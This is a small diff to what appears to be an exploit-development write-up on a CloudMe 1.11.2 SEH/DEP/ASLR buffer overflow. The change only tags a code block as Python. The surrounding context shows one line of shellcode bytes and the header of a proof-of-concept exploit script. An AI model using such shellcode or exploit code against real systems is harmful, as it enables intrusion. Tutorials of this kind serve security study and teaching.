@@ -1783,7 +1783,7 @@ buf += b"\xb5\x0f\x76\x3e\x71\xfc\x0a\x2f\x14\x02\xb8\x50\x3d"
 Now lets finalize our PoC exploit script and see the registers pushed into the stack using <b>WinDbg</b> debugger. The final exploit will be as follows :
 </p>
 
-```
+```python
 # Exploit Title: CloudMe 1.11.2 - SEH/DEP/ASLR Buffer Overflow 
 # Date: 2020-05-20
 # Exploit Author: Xenofon Vassilakopoulos
